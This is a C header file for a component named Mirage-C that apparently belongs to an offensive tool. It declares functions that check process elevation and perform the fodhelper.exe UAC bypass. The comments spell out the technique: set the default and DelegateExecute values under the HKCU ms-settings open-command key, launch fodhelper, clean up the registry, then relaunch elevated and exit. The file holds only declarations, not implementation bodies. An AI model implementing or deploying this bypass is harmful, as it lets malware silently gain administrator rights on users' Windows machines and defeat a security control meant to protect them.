/*
 * uac_bypass.h — UAC bypass for Mirage-C
 *
 * Implements the fodhelper.exe UAC bypass technique.
 * Sets registry values under HKCU\Software\Classes\ms-settings\shell\open\command
 * to execute an elevated payload via fodhelper.exe.
 */

#ifndef MIRAGE_UAC_BYPASS_H
#define MIRAGE_UAC_BYPASS_H

#include <stddef.h>

#ifdef __cplusplus
extern "C" {
#endif

/*
 * mirage_is_elevated — Check if current process has admin privileges.
 *
 * Queries the process token for TokenElevation.
 * Returns 1 if elevated, 0 otherwise.
 */
int mirage_is_elevated(void);

/*
 * mirage_uac_bypass — Execute fodhelper UAC bypass.
 *
 * Sets the default value and DelegateExecute under
 * HKCU\Software\Classes\ms-settings\shell\open\command
 * to the specified exe_path, launches fodhelper.exe, waits 2 seconds,
 * then cleans up the registry entries.
 *
 * Requires Windows 10 build < 18362.
 * Returns 1 on success, 0 on failure.
 */
int mirage_uac_bypass(const char* exe_path);

/*
 * mirage_elevate_and_exit — Elevate current process via UAC bypass.
 *
 * Gets own module path, attempts UAC bypass, calls ExitProcess(0)
 * on success. Does nothing if already elevated.
 */
void mirage_elevate_and_exit(void);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_UAC_BYPASS_H */
